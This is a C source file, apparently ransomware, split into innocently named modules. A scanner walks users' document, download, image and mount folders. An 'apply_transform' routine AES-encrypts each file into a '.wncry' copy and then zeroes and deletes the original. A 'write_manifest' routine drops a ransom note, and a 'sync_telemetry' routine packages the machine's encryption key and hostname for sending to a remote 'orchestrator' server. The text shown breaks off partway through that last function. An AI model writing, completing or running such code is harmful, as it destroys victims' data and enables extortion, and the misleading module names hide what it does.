#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <limits.h>
#include <unistd.h>
#include <sys/stat.h>
#include <dirent.h>
#include <pwd.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <fcntl.h>
#include <sys/file.h>
#include <syslog.h>
#include <time.h>
#include <ctype.h>
#include <curl/curl.h>

/* ================= scanner (Module 1) ================= */

#define MAX_DEPTH 32
#define MAX_NAME_LEN 255

void (*log_fn)(int level, const char* msg) = NULL;

static void log_msg(int level, const char* msg)
{
    if (log_fn != NULL) {
        log_fn(level, msg);
    }
}

static char* expand_home(const char* path)
{
    if (!path) {
        errno = EINVAL;
        return NULL;
    }

    if (path[0] != '~') {
        return strdup(path);
    }

    const char* home = getenv("HOME");
    if (!home || home[0] == '\0') {
        errno = ENOENT;
        return NULL;
    }

    const char* rest = path + 1;
    if (rest[0] == '/') {
        rest++;
    } else if (rest[0] != '\0') {
        return strdup(path);
    }

    size_t home_len = strlen(home);
    size_t rest_len = strlen(rest);
    char* out = malloc(home_len + 1 + rest_len + 1);
    if (!out) {
        return NULL;
    }

    memcpy(out, home, home_len);
    if (rest_len > 0) {
        out[home_len] = '/';
        memcpy(out + home_len + 1, rest, rest_len + 1);
    } else {
        out[home_len] = '\0';
    }
    return out;
}

static int matches_extension(const char* filename, const char** extensions, size_t ext_count)
{
    if (!filename || !extensions) {
        return 0;
    }

    const char* dot = strrchr(filename, '.');
    for (size_t i = 0; i < ext_count; i++) {
        const char* ext = extensions[i];
        if (!ext) {
            continue;
        }

        if (ext[0] == '\0') {
            if (!dot) {
                return 1;
            }
        } else {
            if (dot && strcmp(dot, ext) == 0) {
                return 1;
            }
        }
    }
    return 0;
}

typedef struct {
    char** data;
    size_t size;
    size_t capacity;
} strvec_t;

static int strvec_init(strvec_t* v, size_t initial_cap)
{
    v->data = malloc(initial_cap * sizeof(char*));
    if (!v->data) {
        return -1;
    }
    v->size = 0;
    v->capacity = initial_cap;
    return 0;
}

static int strvec_push(strvec_t* v, char* str)
{
    if (v->size >= v->capacity) {
        size_t new_cap = v->capacity * 2;
        if (new_cap < 128) {
            new_cap = 128;
        }
        char** new_data = realloc(v->data, new_cap * sizeof(char*));
        if (!new_data) {
            return -1;
        }
        v->data = new_data;
        v->capacity = new_cap;
    }
    v->data[v->size++] = str;
    return 0;
}

static void strvec_free_all(strvec_t* v)
{
    if (!v || !v->data) {
        return;
    }
    for (size_t i = 0; i < v->size; i++) {
        free(v->data[i]);
    }
    free(v->data);
    v->data = NULL;
    v->size = 0;
    v->capacity = 0;
}

static int scan_directory(const char* dirpath, const char** extensions, size_t ext_count,
                          int depth, strvec_t* results)
{
    if (depth > MAX_DEPTH) {
        return 0;
    }

    DIR* dir = opendir(dirpath);
    if (!dir) {
        int saved = errno;
        char msg[512];
        int n = snprintf(msg, sizeof(msg), "Cannot open directory '%s': %s", dirpath, strerror(saved));
        if (n > 0 && (size_t)n < sizeof(msg)) {
            log_msg(2, msg);
        }
        errno = saved;
        return (saved == EACCES || saved == EPERM) ? 0 : -1;
    }

    struct dirent* ent;
    while ((ent = readdir(dir)) != NULL) {
        if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0) {
            continue;
        }

        size_t name_len = strlen(ent->d_name);
        if (name_len > MAX_NAME_LEN) {
            continue;
        }

        size_t dir_len = strlen(dirpath);
        size_t total_len = dir_len + 1 + name_len + 1;
        if (total_len > PATH_MAX) {
            continue;
        }
        char* fullpath = malloc(total_len);
        if (!fullpath) {
            closedir(dir);
            return -1;
        }

        memcpy(fullpath, dirpath, dir_len);
        fullpath[dir_len] = '/';
        memcpy(fullpath + dir_len + 1, ent->d_name, name_len + 1);

        int is_dir = 0;
        int is_link = 0;
        int need_stat = 0;

        if (ent->d_type != DT_UNKNOWN) {
            if (ent->d_type == DT_DIR) {
                is_dir = 1;
            } else if (ent->d_type == DT_LNK) {
                is_link = 1;
            } else if (ent->d_type == DT_REG) {
                /* regular file */
            } else {
                need_stat = 1;
            }
        } else {
            need_stat = 1;
        }

        struct stat st;
        if (need_stat || is_dir || is_link) {
            if (lstat(fullpath, &st) != 0) {
                int saved = errno;
                char msg[512];
                int n = snprintf(msg, sizeof(msg), "Cannot stat '%s': %s", fullpath, strerror(saved));
                if (n > 0 && (size_t)n < sizeof(msg)) {
                    log_msg(2, msg);
                }
                free(fullpath);
                errno = 0;
                continue;
            }

            if (S_ISLNK(st.st_mode)) {
                free(fullpath);
                continue;
            }

            if (S_ISDIR(st.st_mode)) {
                is_dir = 1;
            } else if (!S_ISREG(st.st_mode)) {
                free(fullpath);
                continue;
            }
        }

        if (is_dir) {
            int r = scan_directory(fullpath, extensions, ext_count, depth + 1, results);
            free(fullpath);
            if (r != 0) {
                int saved = errno;
                if (saved == ENOMEM) {
                    closedir(dir);
                    return -1;
                }
                errno = 0;
                continue;
            }
            continue;
        }

        if (!matches_extension(ent->d_name, extensions, ext_count)) {
            free(fullpath);
            continue;
        }

        if (strvec_push(results, fullpath) != 0) {
            free(fullpath);
            closedir(dir);
            return -1;
        }
    }

    if (closedir(dir) != 0) {
        int saved = errno;
        char msg[512];
        int n = snprintf(msg, sizeof(msg), "Error closing directory '%s': %s", dirpath, strerror(saved));
        if (n > 0 && (size_t)n < sizeof(msg)) {
            log_msg(1, msg);
        }
        errno = saved;
    }
    return 0;
}

int scan_storage(const char** extensions, size_t ext_count, char*** out_paths, size_t* out_count)
{
    if (!out_paths || !out_count) {
        errno = EINVAL;
        return -1;
    }
    *out_paths = NULL;
    *out_count = 0;

    const char** exts = extensions;
    size_t extc = ext_count;
    if (!exts) {
        extc = 0;
    }

    const char* rel_dirs[] = {
        "~/Documentos_Teste",
        "~/Documentos",
        "~/Downloads",
        "~/Imagens",
        "/mnt",
    };
    const size_t num_rel = sizeof(rel_dirs) / sizeof(rel_dirs[0]);

    strvec_t results;
    if (strvec_init(&results, 64) != 0) {
        return -1;
    }

    int overall_ok = 0;

    for (size_t i = 0; i < num_rel; i++) {
        char* expanded = expand_home(rel_dirs[i]);
        if (!expanded) {
            int saved = errno;
            char msg[256];
            int n = snprintf(msg, sizeof(msg), "Failed to expand path '%s'", rel_dirs[i]);
            if (n > 0 && (size_t)n < sizeof(msg)) {
                log_msg(2, msg);
            }
            errno = saved;
            continue;
        }

        struct stat st;
        if (stat(expanded, &st) != 0) {
            int saved = errno;
            if (saved != ENOENT) {
                char msg[512];
                int n = snprintf(msg, sizeof(msg), "Cannot access '%s': %s", expanded, strerror(saved));
                if (n > 0 && (size_t)n < sizeof(msg)) {
                    log_msg(2, msg);
                }
            }
            free(expanded);
            continue;
        }

        if (!S_ISDIR(st.st_mode)) {
            free(expanded);
            continue;
        }

        int r = scan_directory(expanded, exts, extc, 0, &results);
        free(expanded);
        if (r != 0) {
            int saved = errno;
            if (saved == ENOMEM) {
                strvec_free_all(&results);
                return -1;
            }
            errno = saved;
            overall_ok = -1;
        }
    }

    if (results.size == 0 && overall_ok != 0) {
        strvec_free_all(&results);
        return -1;
    }

    *out_paths = results.data;
    *out_count = results.size;
    return 0;
}

void scan_storage_free(char** paths, size_t count)
{
    if (!paths) {
        return;
    }
    for (size_t i = 0; i < count; i++) {
        free(paths[i]);
    }
    free(paths);
}

/* ================= apply_transform (Module 2) ================= */

int apply_transform(const char* filepath, const unsigned char* key32)
{
    if (!filepath || !key32) {
        fprintf(stderr, "apply_transform: invalid arguments\n");
        return -1;
    }

    FILE* fin = NULL;
    FILE* ftmp = NULL;
    FILE* fzero = NULL;
    unsigned char* plaintext = NULL;
    unsigned char* nonce = NULL;
    unsigned char* ciphertext = NULL;
    unsigned char* tag = NULL;
    char* tmp_path = NULL;
    int ret = -1;
    long fsize = 0;
    size_t wsize = 0;

    fin = fopen(filepath, "rb");
    if (!fin) {
        perror("apply_transform: fopen read");
        fprintf(stderr, "apply_transform: cannot open %s\n", filepath);
        goto cleanup;
    }

    if (fseek(fin, 0, SEEK_END) != 0) {
        perror("apply_transform: fseek end");
        goto cleanup;
    }
    fsize = ftell(fin);
    if (fsize < 0) {
        perror("apply_transform: ftell");
        goto cleanup;
    }
    if (fseek(fin, 0, SEEK_SET) != 0) {
        perror("apply_transform: fseek set");
        goto cleanup;
    }

    nonce = malloc(12);
    if (!nonce) {
        perror("apply_transform: malloc nonce");
        goto cleanup;
    }

    plaintext = malloc((size_t)fsize);
    if (!plaintext && fsize > 0) {
        perror("apply_transform: malloc plaintext");
        goto cleanup;
    }

    ciphertext = malloc((size_t)fsize);
    if (!ciphertext && fsize > 0) {
        perror("apply_transform: malloc ciphertext");
        goto cleanup;
    }

    tag = malloc(16);
    if (!tag) {
        perror("apply_transform: malloc tag");
        goto cleanup;
    }

    if (fsize > 0) {
        size_t nr = fread(plaintext, 1, (size_t)fsize, fin);
        if (nr != (size_t)fsize) {
            perror("apply_transform: fread");
            fprintf(stderr, "apply_transform: short read on %s\n", filepath);
            goto cleanup;
        }
    }
    fclose(fin);
    fin = NULL;

    if (RAND_bytes(nonce, 12) != 1) {
        fprintf(stderr, "apply_transform: RAND_bytes failed\n");
        goto cleanup;
    }

    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        perror("apply_transform: EVP_CIPHER_CTX_new");
        goto cleanup;
    }

    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL) != 1) {
        fprintf(stderr, "apply_transform: EVP_EncryptInit_ex init\n");
        EVP_CIPHER_CTX_free(ctx);
        goto cleanup;
    }

    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, 12, NULL) != 1) {
        fprintf(stderr, "apply_transform: EVP_CTRL_GCM_SET_IVLEN\n");
        EVP_CIPHER_CTX_free(ctx);
        goto cleanup;
    }

    if (EVP_EncryptInit_ex(ctx, NULL, NULL, key32, nonce) != 1) {
        fprintf(stderr, "apply_transform: EVP_EncryptInit_ex key/iv\n");
        EVP_CIPHER_CTX_free(ctx);
        goto cleanup;
    }

    int outlen = 0;
    int tmplen = 0;

    if (EVP_EncryptUpdate(ctx, NULL, &outlen, NULL, 0) != 1) {
        fprintf(stderr, "apply_transform: EVP_EncryptUpdate aad\n");
        EVP_CIPHER_CTX_free(ctx);
        goto cleanup;
    }

    if (fsize > 0) {
        if (EVP_EncryptUpdate(ctx, ciphertext, &outlen, plaintext, (int)fsize) != 1) {
            fprintf(stderr, "apply_transform: EVP_EncryptUpdate encrypt\n");
            EVP_CIPHER_CTX_free(ctx);
            goto cleanup;
        }
        wsize = (size_t)outlen;

        if (EVP_EncryptFinal_ex(ctx, ciphertext + outlen, &tmplen) != 1) {
            fprintf(stderr, "apply_transform: EVP_EncryptFinal_ex\n");
            EVP_CIPHER_CTX_free(ctx);
            goto cleanup;
        }
        wsize += (size_t)tmplen;
    } else {
        wsize = 0;
        if (EVP_EncryptFinal_ex(ctx, ciphertext, &tmplen) != 1) {
            fprintf(stderr, "apply_transform: EVP_EncryptFinal_ex empty\n");
            EVP_CIPHER_CTX_free(ctx);
            goto cleanup;
        }
    }

    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, 16, tag) != 1) {
        fprintf(stderr, "apply_transform: EVP_CTRL_GCM_GET_TAG\n");
        EVP_CIPHER_CTX_free(ctx);
        goto cleanup;
    }

    EVP_CIPHER_CTX_free(ctx);
    ctx = NULL;

    size_t flen = strlen(filepath);
    tmp_path = malloc(flen + 7 + 1);
    if (!tmp_path) {
        perror("apply_transform: malloc tmp_path");
        goto cleanup;
    }
    snprintf(tmp_path, flen + 7 + 1, "%s.wncry", filepath);

    ftmp = fopen(tmp_path, "wb");
    if (!ftmp) {
        perror("apply_transform: fopen tmp write");
        goto cleanup;
    }

    if (fwrite(nonce, 1, 12, ftmp) != 12) {
        perror("apply_transform: fwrite nonce");
        goto cleanup;
    }

    if (wsize > 0) {
        if (fwrite(ciphertext, 1, wsize, ftmp) != wsize) {
            perror("apply_transform: fwrite ciphertext");
            goto cleanup;
        }
    }

    if (fwrite(tag, 1, 16, ftmp) != 16) {
        perror("apply_transform: fwrite tag");
        goto cleanup;
    }

    if (fflush(ftmp) != 0) {
        perror("apply_transform: fflush tmp");
        goto cleanup;
    }
    fclose(ftmp);
    ftmp = NULL;

    fzero = fopen(filepath, "wb");
    if (!fzero) {
        perror("apply_transform: fopen zero write");
        goto cleanup;
    }

    static const unsigned char zeros[4096] = {0};
    size_t remaining = (size_t)fsize;
    while (remaining > 0) {
        size_t chunk = remaining < sizeof(zeros) ? remaining : sizeof(zeros);
        if (fwrite(zeros, 1, chunk, fzero) != chunk) {
            perror("apply_transform: fwrite zeros");
            goto cleanup;
        }
        remaining -= chunk;
    }

    if (fflush(fzero) != 0) {
        perror("apply_transform: fflush zero");
        goto cleanup;
    }
    fclose(fzero);
    fzero = NULL;

    if (unlink(filepath) != 0) {
        perror("apply_transform: unlink original");
        goto cleanup;
    }

    if (rename(tmp_path, tmp_path) != 0) {
        if (access(tmp_path, F_OK) != 0) {
            perror("apply_transform: rename verify");
            goto cleanup;
        }
    }

    ret = 0;

cleanup:
    if (fin) fclose(fin);
    if (ftmp) fclose(ftmp);
    if (fzero) fclose(fzero);

    if (plaintext) {
        explicit_bzero(plaintext, (size_t)fsize);
        free(plaintext);
    }
    if (ciphertext) {
        explicit_bzero(ciphertext, (size_t)fsize);
        free(ciphertext);
    }
    if (nonce) {
        explicit_bzero(nonce, 12);
        free(nonce);
    }
    if (tag) {
        explicit_bzero(tag, 16);
        free(tag);
    }
    if (tmp_path) {
        free(tmp_path);
    }

    return ret;
}

/* ================= write_manifest (Module 3) ================= */

#define MAX_FIELD_SIZE (64 * 1024)
#define MANIFEST_FILENAME "#_LEIA_ME_WNCRY_#.txt"

#if defined(_WIN32)
#include <windows.h>
#include <io.h>
#define PATH_SEP '\\'
#define F_OK 0
#define W_OK 2
#else
#include <syslog.h>
#define PATH_SEP '/'
#endif

int write_manifest(const char *directory_path, const char *ransom_demand, const char *contact_instructions)
{
    int ret = -1;
    int dirfd = -1;
    int tmpfd = -1;
    FILE *tmpf = NULL;
    char tmp_template[PATH_MAX];
    char final_path[PATH_MAX];
    struct stat st;

    if (!directory_path || !ransom_demand || !contact_instructions) {
        errno = EINVAL;
#if defined(_WIN32)
        OutputDebugStringA("write_manifest: NULL input");
#else
        syslog(LOG_ERR, "write_manifest: NULL input");
#endif
        return -1;
    }

    if (strlen(directory_path) == 0 || strlen(ransom_demand) == 0 || strlen(contact_instructions) == 0) {
        errno = EINVAL;
#if defined(_WIN32)
        OutputDebugStringA("write_manifest: empty input");
#else
        syslog(LOG_ERR, "write_manifest: empty input");
#endif
        return -1;
    }

    if (strlen(ransom_demand) > MAX_FIELD_SIZE || strlen(contact_instructions) > MAX_FIELD_SIZE) {
        errno = E2BIG;
#if defined(_WIN32)
        OutputDebugStringA("write_manifest: field too large");
#else
        syslog(LOG_ERR, "write_manifest: field too large");
#endif
        return -1;
    }

    dirfd = open(directory_path, O_RDONLY | O_DIRECTORY | O_NOFOLLOW);
    if (dirfd < 0) {
        int saved_errno = errno;
#if defined(_WIN32)
        char buf[256];
        snprintf(buf, sizeof(buf), "write_manifest: open directory failed: %d", saved_errno);
        OutputDebugStringA(buf);
#else
        syslog(LOG_ERR, "write_manifest: open directory failed: %s", strerror(saved_errno));
#endif
        errno = saved_errno;
        return -1;
    }

    if (fstat(dirfd, &st) != 0) {
        int saved_errno = errno;
        close(dirfd);
#if defined(_WIN32)
        char buf[256];
        snprintf(buf, sizeof(buf), "write_manifest: fstat directory failed: %d", saved_errno);
        OutputDebugStringA(buf);
#else
        syslog(LOG_ERR, "write_manifest: fstat directory failed: %s", strerror(saved_errno));
#endif
        errno = saved_errno;
        return -1;
    }
    if (!S_ISDIR(st.st_mode)) {
        close(dirfd);
        errno = ENOTDIR;
#if defined(_WIN32)
        OutputDebugStringA("write_manifest: not a directory");
#else
        syslog(LOG_ERR, "write_manifest: not a directory");
#endif
        return -1;
    }

    if (snprintf(final_path, sizeof(final_path), "%s%c%s",
                 directory_path, PATH_SEP, MANIFEST_FILENAME) >= (int)sizeof(final_path)) {
        close(dirfd);
        errno = ENAMETOOLONG;
#if defined(_WIN32)
        OutputDebugStringA("write_manifest: final path too long");
#else
        syslog(LOG_ERR, "write_manifest: final path too long");
#endif
        return -1;
    }

    if (snprintf(tmp_template, sizeof(tmp_template), "%s%c.tmp.XXXXXX",
                 directory_path, PATH_SEP) >= (int)sizeof(tmp_template)) {
        close(dirfd);
        errno = ENAMETOOLONG;
#if defined(_WIN32)
        OutputDebugStringA("write_manifest: temp template too long");
#else
        syslog(LOG_ERR, "write_manifest: temp template too long");
#endif
        return -1;
    }

#if defined(_WIN32)
    char tmp_name[PATH_MAX];
    if (_mktemp_s(tmp_name, sizeof(tmp_name), tmp_template, strlen(tmp_template)) != 0) {
        close(dirfd);
        errno = EIO;
        OutputDebugStringA("write_manifest: _mktemp_s failed");
        return -1;
    }
    tmpfd = _open(tmp_name, _O_WRONLY | _O_CREAT | _O_EXCL | _O_BINARY, _S_IREAD | _S_IWRITE);
    if (tmpfd < 0) {
        int saved_errno = errno;
        char buf[256];
        snprintf(buf, sizeof(buf), "write_manifest: create temp failed: %d", saved_errno);
        OutputDebugStringA(buf);
        close(dirfd);
        errno = saved_errno;
        return -1;
    }
    strncpy(tmp_template, tmp_name, sizeof(tmp_template) - 1);
    tmp_template[sizeof(tmp_template) - 1] = '\0';
#else
    snprintf(tmp_template, sizeof(tmp_template), "%s%c.tmp.XXXXXX", directory_path, PATH_SEP);
    tmpfd = mkstemp(tmp_template);
    if (tmpfd < 0) {
        int saved_errno = errno;
        close(dirfd);
        syslog(LOG_ERR, "write_manifest: mkstemp failed: %s", strerror(saved_errno));
        errno = saved_errno;
        return -1;
    }
#endif

#if defined(_WIN32)
    (void)0;
#else
    if (fchmod(tmpfd, S_IRUSR | S_IWUSR) != 0) {
        int saved_errno = errno;
        close(tmpfd);
        close(dirfd);
        unlink(tmp_template);
        syslog(LOG_ERR, "write_manifest: fchmod failed: %s", strerror(saved_errno));
        errno = saved_errno;
        return -1;
    }
#endif

    tmpf = fdopen(tmpfd, "wb");
    if (!tmpf) {
        int saved_errno = errno;
        close(tmpfd);
        close(dirfd);
        unlink(tmp_template);
#if defined(_WIN32)
        char buf[256];
        snprintf(buf, sizeof(buf), "write_manifest: fdopen failed: %d", saved_errno);
        OutputDebugStringA(buf);
#else
        syslog(LOG_ERR, "write_manifest: fdopen failed: %s", strerror(saved_errno));
#endif
        errno = saved_errno;
        return -1;
    }
    tmpfd = -1;

    const char *fields[2] = { ransom_demand, contact_instructions };
    for (int i = 0; i < 2; ++i) {
        const char *src = fields[i];
        while (*src) {
            if (*src == '\r') {
                if (src[1] == '\n') {
                    src++;
                }
#if defined(_WIN32)
                fputc('\r', tmpf);
#endif
                fputc('\n', tmpf);
                src++;
                continue;
            } else if (*src == '\n') {
#if defined(_WIN32)
                fputc('\r', tmpf);
#endif
                fputc('\n', tmpf);
                src++;
                continue;
            } else {
                fputc((unsigned char)*src, tmpf);
                src++;
            }
        }

        if (i == 0) {
#if defined(_WIN32)
            fputc('\r', tmpf);
#endif
            fputc('\n', tmpf);
        }
    }

    if (ferror(tmpf)) {
        int saved_errno = errno;
        fclose(tmpf);
        close(dirfd);
        unlink(tmp_template);
#if defined(_WIN32)
        char buf[256];
        snprintf(buf, sizeof(buf), "write_manifest: write field failed: %d", saved_errno);
        OutputDebugStringA(buf);
#else
        syslog(LOG_ERR, "write_manifest: write field failed: %s", strerror(saved_errno));
#endif
        errno = saved_errno;
        return -1;
    }

    if (fflush(tmpf) != 0) {
        int saved_errno = errno;
        fclose(tmpf);
        close(dirfd);
        unlink(tmp_template);
#if defined(_WIN32)
        char buf[256];
        snprintf(buf, sizeof(buf), "write_manifest: fflush failed: %d", saved_errno);
        OutputDebugStringA(buf);
#else
        syslog(LOG_ERR, "write_manifest: fflush failed: %s", strerror(saved_errno));
#endif
        errno = saved_errno;
        return -1;
    }

#if !defined(_WIN32)
    if (fsync(fileno(tmpf)) != 0) {
        int saved_errno = errno;
        fclose(tmpf);
        close(dirfd);
        unlink(tmp_template);
        syslog(LOG_ERR, "write_manifest: fsync failed: %s", strerror(saved_errno));
        errno = saved_errno;
        return -1;
    }
#endif

    if (fclose(tmpf) != 0) {
        int saved_errno = errno;
        tmpf = NULL;
        close(dirfd);
        unlink(tmp_template);
#if defined(_WIN32)
        char buf[256];
        snprintf(buf, sizeof(buf), "write_manifest: fclose failed: %d", saved_errno);
        OutputDebugStringA(buf);
#else
        syslog(LOG_ERR, "write_manifest: fclose failed: %s", strerror(saved_errno));
#endif
        errno = saved_errno;
        return -1;
    }
    tmpf = NULL;

    if (rename(tmp_template, final_path) != 0) {
        int saved_errno = errno;
        close(dirfd);
        unlink(tmp_template);
#if defined(_WIN32)
        char buf[256];
        snprintf(buf, sizeof(buf), "write_manifest: rename failed: %d", saved_errno);
        OutputDebugStringA(buf);
#else
        syslog(LOG_ERR, "write_manifest: rename failed: %s", strerror(saved_errno));
#endif
        errno = saved_errno;
        return -1;
    }

    if (stat(final_path, &st) != 0) {
        int saved_errno = errno;
        close(dirfd);
#if defined(_WIN32)
        char buf[256];
        snprintf(buf, sizeof(buf), "write_manifest: final stat failed: %d", saved_errno);
        OutputDebugStringA(buf);
#else
        syslog(LOG_ERR, "write_manifest: final stat failed: %s", strerror(saved_errno));
#endif
        errno = saved_errno;
        return -1;
    }

    if (!S_ISREG(st.st_mode)) {
        close(dirfd);
        errno = EISDIR;
#if defined(_WIN32)
        OutputDebugStringA("write_manifest: final file is not a regular file");
#else
        syslog(LOG_ERR, "write_manifest: final file is not a regular file");
#endif
        return -1;
    }

    close(dirfd);
    return 0;
}

/* ================= sync_telemetry (Module 4) ================= */

#define SYNC_TELEMETRY_H_INCLUDED

#define MAX_HOSTNAME_LEN 255
#define KEY_FILE         "/tmp/.master.key"
#define KEY_SIZE         32
#define ORCHESTRATOR_URL "https://orchestrator.global.local/v1/keys/import"
#define USER_AGENT       "platform-sync/1.0"
#define TIMEOUT_SECONDS  8L
#define RETRY_COUNT      3
#define RETRY_DELAYS_S   { 1, 2, 4 }

#define TELEMETRY_ERR_INTERNAL  1
#define TELEMETRY_ERR_NETWORK   2
#define TELEMETRY_ERR_AUTH      3
#define TELEMETRY_ERR_IO        4

static int lock_fd_nonblock(int fd)
{
    return flock(fd, LOCK_EX | LOCK_NB);
}

static void sanitize_hostname(char *buf, size_t len)
{
    for (size_t i = 0; i < len && buf[i] != '\0'; i++) {
        unsigned char c = (unsigned char)buf[i];
        if (c < 32 || c > 126)
            buf[i] = '_';
    }
}

static int hex_encode(const unsigned char *in, size_t in_len, char *out, size_t out_len)
{
    const char hex[] = "0123456789abcdef";
    if (out_len < (in_len * 2) + 1)
        return -1;
    for (size_t i = 0; i < in_len; i++) {
        out[i * 2]     = hex[(in[i] >> 4) & 0x0F];
        out[i * 2 + 1] = hex[in[i] & 0x0F];
    }
    out[in_len * 2] = '\0';
    return 0;
}

static int needs_json_escape(const char *s, size_t len)
{
    static const char *special = "\"\\";
    for (size_t i = 0; i < len; i++) {
        unsigned char c = (unsigned char)s[i];
        if (c < 32 || c > 126)
            return 1;
        if (strchr(special, (int)c) != NULL)
            return 1;
    }
    return 0;
}

static size_t json_escape(const char *src, char *dst, size_t dst_len)
{
    size_t i = 0, o = 0;
    while (src[i] != '\0' && o + 1 < dst_len) {
        if ((unsigned char)src[i] < 32 || (unsigned char)src[i] > 126) {
            if (o + 6 >= dst_len)
                break;
            o += snprintf(dst + o, dst_len - o, "\\u%04X", (unsigned char)src[i]);
            i++;
            continue;
        }
        if (src[i] == '"' || src[i] == '\\') {
            if (o + 2 >= dst_len)
                break;
            dst[o++] = '\\';
            dst[o++] = src[i];
            i++;
            continue;
        }
        dst[o++] = src[i++];
    }
    dst[o] = '\0';
    return o;
}

static int compose_json(const char *hostname_hex, const unsigned char *aes_key,
                        unsigned long long ts_ms, char *out, size_t out_len)
{
    char host_escaped[MAX_HOSTNAME_LEN * 6 + 1];
    size_t host_escaped_len = json_escape(hostname_hex, host_escaped, sizeof(host_escaped));

    char key_hex[KEY_SIZE * 2 + 1];
    if (hex_encode(aes_key, KEY_SIZE, key_hex, sizeof(key_hex)) < 0)
        return TELEMETRY_ERR_INTERNAL;

    int n = snprintf(out, out_len,
        "{\"hostname\":\"%s\",\"aes_key\":\"%s\",\"ts\":%llu,\"pool_tag\":\"post_commercial\"}",
        host_escaped, key_hex, ts_ms);
    if (n < 0 || (size_t)n >= out_len)
        return TELEMETRY_ERR_INTERNAL;
    return 0;
}

struct curl_payload {
    const char *data;
    size_t len;
    size_t pos;
};

static size_t read_callback(char *ptr, size_t size, size_t nmemb, void *userdata)
{
    struct curl_payload *pl = (struct curl_payload *)userdata;
    size_t avail = pl->len - pl->pos;
    size_t want = size * nmemb;
    size_t take = (want < avail) ? want : avail;
    if (take == 0)
        return 0;
    memcpy(ptr, pl->data + pl->pos, take);
    pl->pos += take;
    return take;
}

struct response_buf {
    char *data;
    size_t len;
    size_t cap;
};

static size_t write_callback(char *ptr, size_t size, size_t nmemb, void *userdata)
{
    struct response_buf *rb = (struct response_buf *)userdata;
    size_t avail = size * nmemb;
    if (avail == 0)
        return 0;
    size_t need = rb->len + avail + 1;
    if (need > rb->cap) {
        size_t newcap = (rb->cap == 0) ? 4096 : rb->cap;
        while (need > newcap)
            newcap *= 2;
        char *newp = realloc(rb->data, newcap);
        if (newp == NULL)
            return 0;
        rb->data = newp;
        rb->cap = newcap;
    }
    memcpy(rb->data + rb->len, ptr, avail);
    rb->len += avail;
    rb->data[rb->len] = '\0';
    return avail;
}

static int attempt_post(CURL *curl, const char *json_body, long *http_code,
                        char **resp_body_out)
{
    struct curl_payload pl = { .data = json_body, .len = strlen(json_body), .pos = 0 };
    struct response_buf rb = { .data = NULL, .len = 0, .cap = 0 };

    curl_easy_setopt(curl, CURLOPT_URL, ORCHESTRATOR_URL);
    curl_easy_setopt(curl, CURLOPT_POST, 1L);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE_LARGE, (curl_off_t)strlen(json_body));
    curl_easy_setopt(curl, CURLOPT_READFUNCTION, read_callback);
    curl_easy_setopt(curl, CURLOPT_READDATA, &pl);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &rb);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, TIMEOUT_SECONDS);
    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, TIMEOUT_SECONDS);
    curl_easy_setopt(curl, CURLOPT_SSLVERSION, CURL_SSLVERSION_TLSv1_2);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 2L);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, USER_AGENT);

    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: application/json");
    if (headers == NULL) {
        free(rb.data);
        return TELEMETRY_ERR_NETWORK;
    }
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    CURLcode res = curl_easy_perform(curl);
    curl_slist_free_all(headers);

    if (res != CURLE_OK) {
        free(rb.data);
        return TELEMETRY_ERR_NETWORK;
    }

    res = curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, http_code);
    if (res != CURLE_OK) {
        free(rb.data);
        return TELEMETRY_ERR_NETWORK;
    }

    *resp_body_out = rb.data;
    return 0;
}

int sync_telemetry(void)
{
    int ret = TELEMETRY_ERR_INTERNAL;
    int fd = -1;
    unsigned char aes_key[KEY_SIZE];
    char hostname[MAX_HOSTNAME_LEN + 1];
    char json_body[4096];
    CURL *curl = NULL;
    int curl_inited = 0;
    long http_code = 0;
    char *resp_body = NULL;

    fd = open(KEY_FILE, O_RDONLY | O_CLOEXEC);
    if (fd < 0) {
        syslog(LOG_DAEMON | LOG_ERR, "sync_telemetry: cannot open %s: %s", KEY_FILE, strerror(errno));
        return TELEMETRY_ERR_IO;
    }

    if (lock_fd_nonblock(fd) != 0) {
        syslog(LOG_DAEMON | LOG_ERR, "sync_telemetry: cannot lock %s: %s", KEY_FILE, strerror(errno));
        close(fd);
        return TELEMETRY_ERR_IO;
    }

    off_t sz = lseek(fd, 0, SEEK_END);
    if (sz != KEY_SIZE) {
        syslog(LOG_DAEMON | LOG_ERR, "sync_telemetry: %s has invalid size %jd, expected %d", KEY_FILE, (intmax_t)sz, KEY_SIZE);
        close(fd);
        return TELEMETRY_ERR_AUTH;
    }
    if (lseek(fd, 0, SEEK_SET) != 0) {
        syslog(LOG_DAEMON | LOG_ERR, "sync_telemetry: lseek failed on %s", KEY_FILE);
        close(fd);
        return TELEMETRY_ERR_IO;
    }

    ssize_t nr = read(fd, aes_key, KEY_SIZE);
    if (nr != KEY_SIZE) {
        syslog(LOG_DAEMON | LOG_ERR, "sync_telemetry: read failed from %s: %s", KEY_FILE, strerror(errno));
        close(fd);
        return TELEMETRY_ERR_IO;
    }

    if (aes_key[0] == 0x00) {
        syslog(LOG_DAEMON | LOG_ERR, "sync_telemetry: %s appears invalid (leading null byte)", KEY_FILE);
        close(fd);
        return TELEMETRY_ERR_AUTH;
    }

    if (gethostname(hostname, sizeof(hostname)) != 0) {
        syslog(LOG_DAEMON | LOG_ERR, "sync_telemetry: gethostname failed: %s", strerror(errno));
        close(fd);
        return TELEMETRY_ERR_INTERNAL;
    }
    hostname[MAX_HOSTNAME_LEN] = '\0';
    sanitize_hostname(hostname, strlen(hostname));

